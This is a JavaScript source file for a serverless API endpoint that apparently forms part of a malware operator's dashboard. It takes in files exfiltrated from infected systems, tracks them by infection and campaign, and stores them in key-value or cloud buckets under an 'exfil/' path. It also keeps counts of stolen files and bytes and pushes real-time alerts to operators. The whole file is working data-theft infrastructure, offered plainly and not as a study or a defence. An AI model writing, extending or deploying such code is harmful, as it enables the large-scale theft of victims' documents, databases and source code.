// vercel-dashboard/api/exfil/upload.js
// File exfiltration ingestion endpoint - with external storage fallback for large files

import { kv } from '../../lib/kv.js';
import { verifyPayloadApiKey } from '../auth/middleware.js';

const MAX_FILE_SIZE = 100 * 1024; // 100KB - Vercel KV limit per key
const MAX_METADATA_SIZE = 50 * 1024;
const CHUNK_SIZE = 90 * 1024; // 90KB per chunk (safe margin)

// External storage configuration (optional)
// Set EXTERNAL_STORAGE_PROVIDER to 'r2', 's3', or 'blob' and configure credentials
const EXTERNAL_STORAGE = {
  provider: process.env.EXTERNAL_STORAGE_PROVIDER || 'none', // 'none' | 'r2' | 's3' | 'blob'
  bucket: process.env.EXTERNAL_STORAGE_BUCKET,
  region: process.env.EXTERNAL_STORAGE_REGION,
  accessKeyId: process.env.EXTERNAL_STORAGE_ACCESS_KEY,
  secretAccessKey: process.env.EXTERNAL_STORAGE_SECRET_KEY,
  publicUrl: process.env.EXTERNAL_STORAGE_PUBLIC_URL // For direct download links
};

async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-File-Name, X-System-Id, X-Chunk-Index, X-Total-Chunks, X-File-Hash');

  if (request.method === 'OPTIONS') return response.status(200).end();
  if (request.method !== 'POST') return response.status(405).json({ error: 'Method not allowed' });

  try {
    const auth = await verifyPayloadApiKey(request);
    if (!auth.valid) {
      return response.status(auth.status || 401).json({ error: auth.error });
    }
    request.auth = auth;

    const systemId = request.headers['x-system-id'];
    const fileName = request.headers['x-file-name'] || 'unknown';
    const chunkIndex = parseInt(request.headers['x-chunk-index'] || '0');
    const totalChunks = parseInt(request.headers['x-total-chunks'] || '1');
    const fileHash = request.headers['x-file-hash']; // SHA256 for deduplication

    if (!systemId) {
      return response.status(400).json({ error: 'X-System-Id header required' });
    }

    // Verify system belongs to this campaign
    const system = await kv.get(`system:${systemId}`);
    if (!system) {
      return response.status(404).json({ error: 'System not found' });
    }
    if (auth.role === 'campaign' && system.campaignId !== auth.campaignId) {
      return response.status(403).json({ error: 'System not in your campaign' });
    }

    // Read file data
    const chunks = [];
    for await (const chunk of request.body) {
      chunks.push(chunk);
    }
    const fileData = Buffer.concat(chunks);
    const fileSize = fileData.length;

    // Determine storage strategy
    const useExternalStorage = EXTERNAL_STORAGE.provider !== 'none' && fileSize > MAX_FILE_SIZE;
    const useChunking = totalChunks > 1 || fileSize > MAX_FILE_SIZE;

    if (!useExternalStorage && !useChunking && fileSize > MAX_FILE_SIZE) {
      return response.status(413).json({ 
        error: `File too large (${fileSize} bytes). Max ${MAX_FILE_SIZE} for single upload. Use chunked upload or enable external storage.`,
        maxSize: MAX_FILE_SIZE,
        requiresChunking: true,
        externalStorageAvailable: EXTERNAL_STORAGE.provider !== 'none'
      });
    }

    const fileId = `file_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    const now = new Date().toISOString();
    const fileExt = fileName.split('.').pop()?.toLowerCase() || 'bin';

    let storageInfo = { type: 'kv', key: `file:${fileId}:data` };

    if (useExternalStorage) {
      // Upload to external storage
      const externalResult = await uploadToExternalStorage(fileId, fileName, fileData, fileExt);
      storageInfo = { 
        type: 'external', 
        provider: EXTERNAL_STORAGE.provider,
        bucket: EXTERNAL_STORAGE.bucket,
        key: externalResult.key,
        url: externalResult.url,
        size: fileSize
      };
    } else if (useChunking) {
      // Chunked upload to KV
      await storeChunksInKV(fileId, fileData, totalChunks, chunkIndex);
      
      // Check if all chunks received
      const chunkKeys = await kv.keys(`file:${fileId}:chunk:*`);
      if (chunkKeys.length === totalChunks) {
        // Reassemble in KV (if small enough) or move to external
        const reassembled = await reassembleChunks(fileId, totalChunks);
        if (reassembled.length > MAX_FILE_SIZE && EXTERNAL_STORAGE.provider !== 'none') {
          const externalResult = await uploadToExternalStorage(fileId, fileName, reassembled, fileExt);
          storageInfo = { 
            type: 'external', 
            provider: EXTERNAL_STORAGE.provider,
            bucket: EXTERNAL_STORAGE.bucket,
            key: externalResult.key,
            url: externalResult.url,
            size: reassembled.length
          };
          // Clean up KV chunks
          for (let i = 0; i < totalChunks; i++) {
            await kv.del(`file:${fileId}:chunk:${i}`);
          }
        } else {
          storageInfo = { type: 'kv', key: `file:${fileId}:data`, chunked: true };
        }
      } else {
        return response.json({ 
          fileId, 
          chunkReceived: chunkIndex,
          chunksRemaining: totalChunks - chunkKeys.length,
          status: 'chunked'
        });
      }
    } else {
      // Single chunk - store directly in KV
      const fileDataB64 = fileData.toString('base64');
      await kv.set(`file:${fileId}:data`, fileDataB64, { ex: 2592000 }); // 30 days
    }

    // Store metadata
    const meta = {
      id: fileId,
      infectionId: systemId,
      systemId,
      campaignId: system.campaignId,
      fileName,
      fileExt: '.' + fileExt,
      size: fileSize,
      uploadedAt: now,
      contentType: getContentType(fileExt),
      storage: storageInfo,
      hash: fileHash,
      chunked: useChunking
    };

    await kv.set(`file:${fileId}:meta`, meta);

    // Index file under system
    await kv.sadd(`system:${systemId}:files`, fileId);

    // Update system stats (atomic increment)
    await kv.hincrby(`system:${systemId}:stats`, 'filesExfiltrated', 1);
    await kv.hincrby(`system:${systemId}:stats`, 'bytesExfiltrated', fileSize);

    // Update campaign stats
    await kv.hincrby(`campaign:${system.campaignId}:stats`, 'totalFiles', 1);
    await kv.hincrby(`campaign:${system.campaignId}:stats`, 'totalBytes', fileSize);
    await kv.hset(`campaign:${system.campaignId}:stats`, 'lastActivity', now);

    // Update daily campaign stats
    const date = now.split('T')[0];
    await kv.hincrby(`campaign:${system.campaignId}:daily:${date}`, 'uploads', 1);
    await kv.hincrby(`campaign:${system.campaignId}:daily:${date}`, 'bytes', fileSize);
    await kv.hincrby(`campaign:${system.campaignId}:exts`, fileExt, 1);

    // Update global stats
    await kv.hincrby(`global:daily:${date}`, 'uploads', 1);
    await kv.hincrby(`global:daily:${date}`, 'bytes', fileSize);
    await kv.hincrby(`global:exts`, fileExt, 1);
    await kv.sadd('global:files', fileId);

    // Emit real-time event
    await publishRealtimeEvent('file:uploaded', {
      fileId,
      systemId,
      campaignId: system.campaignId,
      fileName,
      fileExt: '.' + fileExt,
      size: fileSize,
      storage: storageInfo.type,
      uploadedAt: now
    });

    response.json({ 
      fileId, 
      status: 'uploaded',
      size: fileSize,
      storage: storageInfo.type,
      downloadUrl: storageInfo.url || null
    });

  } catch (error) {
    console.error('Exfil upload error:', error);
    response.status(500).json({ error: 'Internal server error' });
  }
}

async function storeChunksInKV(fileId, fileData, totalChunks, chunkIndex) {
  const chunkData = fileData.toString('base64');
  await kv.set(`file:${fileId}:chunk:${chunkIndex}`, chunkData, { ex: 86400 }); // 24hr TTL
}

async function reassembleChunks(fileId, totalChunks) {
  let fullData = '';
  for (let i = 0; i < totalChunks; i++) {
    const chunk = await kv.get(`file:${fileId}:chunk:${i}`);
    if (!chunk) throw new Error(`Missing chunk ${i}`);
    fullData += chunk;
  }
  return Buffer.from(fullData, 'base64');
}

async function uploadToExternalStorage(fileId, fileName, fileData, fileExt) {
  const key = `exfil/${fileId}/${fileName}`;
  
  switch (EXTERNAL_STORAGE.provider) {
    case 'r2':
      return await uploadToR2(key, fileData, fileExt);
    case 's3':
      return await uploadToS3(key, fileData, fileExt);
    case 'blob':
      return await uploadToVercelBlob(key, fileData, fileExt);
    default:
      throw new Error(`Unknown storage provider: ${EXTERNAL_STORAGE.provider}`);
  }
}

async function uploadToR2(key, data, contentType) {
  // Cloudflare R2 - S3 compatible
  const { S3Client, PutObjectCommand } = await import('@aws-sdk/client-s3');
  
  const client = new S3Client({
    region: 'auto',
    endpoint: `https://${process.env.R2_ACCOUNT_ID}.r2.cloudflarestorage.com`,
    credentials: {
      accessKeyId: process.env.R2_ACCESS_KEY_ID,
      secretAccessKey: process.env.R2_SECRET_ACCESS_KEY
    }
  });

  await client.send(new PutObjectCommand({
    Bucket: EXTERNAL_STORAGE.bucket,
    Key: key,
    Body: data,
    ContentType: getContentType(contentType)
  }));

  return {
    key,
    url: `${EXTERNAL_STORAGE.publicUrl || `https://${process.env.R2_ACCOUNT_ID}.r2.cloudflarestorage.com/${EXTERNAL_STORAGE.bucket}`}/${key}`
  };
}

async function uploadToS3(key, data, contentType) {
  const { S3Client, PutObjectCommand } = await import('@aws-sdk/client-s3');
  
  const client = new S3Client({
    region: EXTERNAL_STORAGE.region,
    credentials: {
      accessKeyId: EXTERNAL_STORAGE.accessKeyId,
      secretAccessKey: EXTERNAL_STORAGE.secretAccessKey
    }
  });

  await client.send(new PutObjectCommand({
    Bucket: EXTERNAL_STORAGE.bucket,
    Key: key,
    Body: data,
    ContentType: getContentType(contentType)
  }));

  return {
    key,
    url: `https://${EXTERNAL_STORAGE.bucket}.s3.${EXTERNAL_STORAGE.region}.amazonaws.com/${key}`
  };
}

async function uploadToVercelBlob(key, data, contentType) {
  // Vercel Blob storage
  const response = await fetch('https://blob.vercel-storage.com/upload', {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${process.env.BLOB_READ_WRITE_TOKEN}`,
      'Content-Type': getContentType(contentType),
      'X-Vercel-Blob-Pathname': key
    },
    body: data
  });

  if (!response.ok) throw new Error('Blob upload failed');
  const result = await response.json();
  
  return {
    key: result.pathname,
    url: result.url
  };
}

function getContentType(ext) {
  const types = {
    'txt': 'text/plain',
    'doc': 'application/msword',
    'docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    'pdf': 'application/pdf',
    'sql': 'application/sql',
    'json': 'application/json',
    'cs': 'text/x-csharp',
    'py': 'text/x-python',
    'js': 'application/javascript',
    'ts': 'application/typescript',
    'png': 'image/png',
    'jpg': 'image/jpeg',
    'jpeg': 'image/jpeg',
    'zip': 'application/zip',
    'bin': 'application/octet-stream'
  };
  return types[ext] || 'application/octet-stream';
}

// Simple in-memory pub/sub for SSE
const realtimeSubscribers = new Map();

export async function publishRealtimeEvent(event, data) {
  const payload = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
  for (const [_, controller] of realtimeSubscribers) {
    try {
      controller.enqueue(new TextEncoder().encode(payload));
    } catch (e) {}
  }
}

export function subscribeToRealtime(controller) {
  const id = Math.random().toString(36).substring(7);
  realtimeSubscribers.set(id, controller);
  return () => realtimeSubscribers.delete(id);
}

export default handler;